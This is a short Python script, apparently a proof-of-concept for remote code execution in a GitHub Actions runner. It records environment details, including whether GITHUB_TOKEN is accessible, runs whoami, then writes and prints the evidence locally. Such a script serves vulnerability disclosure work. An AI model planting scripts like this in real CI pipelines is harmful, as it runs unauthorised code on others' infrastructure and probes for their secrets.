#!/usr/bin/env python3
import json
import os
import subprocess
import datetime

# Collect evidence of RCE
evidence = {
    'rce_successful': True,
    'timestamp': str(datetime.datetime.now()),
    'github_actor': os.getenv('GITHUB_ACTOR', 'UNKNOWN'),
    'github_token_accessible': bool(os.getenv('GITHUB_TOKEN')),
    'github_ref': os.getenv('GITHUB_REF'),
    'github_repository': os.getenv('GITHUB_REPOSITORY'),
    'runner_name': os.getenv('RUNNER_NAME'),
    'github_workspace': os.getenv('GITHUB_WORKSPACE'),
}

# Try to run system commands to prove execution
try:
    whoami = subprocess.run(['whoami'], capture_output=True, text=True, timeout=5)
    evidence['whoami'] = whoami.stdout.strip()
except Exception as e:
    evidence['whoami'] = f'Error: {str(e)}'

# Write proof artifact
with open('rce_proof.json', 'w') as f:
    json.dump(evidence, f, indent=2)

print('✓ RCE PROOF GENERATED')
print(json.dumps(evidence, indent=2))
